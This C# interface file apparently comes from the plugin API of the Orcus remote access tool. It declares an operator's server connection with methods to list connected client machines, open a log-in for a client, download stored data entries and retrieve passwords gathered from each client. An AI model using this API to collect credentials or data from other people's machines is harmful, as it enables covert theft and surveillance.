using System;
using System.Collections.Generic;
using Orcus.Administration.Plugins.Properties;
using Orcus.Shared.Commands.ComputerInformation;
using Orcus.Shared.Commands.DataManager;
using Orcus.Shared.Commands.ExceptionHandling;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.Connection;
using Orcus.Shared.Core;

namespace Orcus.Administration.Plugins.Administration
{
    /// <summary>
    ///     The connection manager is the direct connection to the server - it is not client dependent
    /// </summary>
    public interface IAdministrationConnectionManager : IServerConnection
    {
        /// <summary>
        ///     The Ip the administration connected to
        /// </summary>
        string Ip { get; }

        /// <summary>
        ///     The port the administration connected to
        /// </summary>
        int Port { get; }

        /// <summary>
        ///     The ip addresses the server runs on
        /// </summary>
        List<IpAddressInfo> IpAddresses { get; }

        /// <summary>
        ///     A client connected
        /// </summary>
        event EventHandler<OnlineClientInformation> ClientConnected;

        /// <summary>
        ///     A client connected for the first time
        /// </summary>
        event EventHandler<OnlineClientInformation> NewClientConnected;

        /// <summary>
        ///     A client disconnected
        /// </summary>
        event EventHandler<int> ClientDisconnected;

        /// <summary>
        ///     Disconnected from server
        /// </summary>
        event EventHandler Disconnected;

        /// <summary>
        ///     Change the group of the given client
        /// </summary>
        void ChangeGroup(List<BaseClientInformation> clients, string newName);

        /// <summary>
        ///     Remove all stored data of the <see cref="clients" />
        /// </summary>
        void RemoveStoredData(List<OfflineClientInformation> clients);

        /// <summary>
        ///     Receive stored computer information from server
        /// </summary>
        ComputerInformation GetComputerInformation(BaseClientInformation client);

        /// <summary>
        ///     Receive stored passwords from server
        /// </summary>
        PasswordData GetPasswords(BaseClientInformation client);

        /// <summary>
        ///     Open the log in menu for the client
        /// </summary>
        void LogInClient(OnlineClientInformation client);

        /// <summary>
        ///     Receive all stored exception which occurred in the give time period
        /// </summary>
        List<ExceptionInfo> GetExceptions(DateTime from, DateTime to);

        /// <summary>
        ///     Return all online and offline clients. If specific clients were viewed by the user, you may cast them to
        ///     <see cref="OnlineClientInformation" /> or <see cref="OfflineClientInformation" />
        /// </summary>
        List<BaseClientInformation> GetAllClients();

        /// <summary>
        ///     Get all available data entries
        /// </summary>
        /// <returns>The data entries</returns>
        List<DataEntry> GetDataEntries();

        /// <summary>
        ///     Download the given data entry and return the data
        /// </summary>
        /// <param name="dataEntry">The data entry to download</param>
        /// <returns>The data of the data entry</returns>
        [CanBeNull]
        byte[] DownloadEntry(DataEntry dataEntry);

        /// <summary>
        ///     Download multiple data entries
        /// </summary>
        /// <param name="dataEntries">The data entries to download</param>
        /// <returns>
        ///     The data of the data entries. Warning: all entries which were not found on the server won't exist in the
        ///     dicitionary
        /// </returns>
        Dictionary<DataEntry, byte[]> DownloadEntries(IEnumerable<DataEntry> dataEntries);
    }
}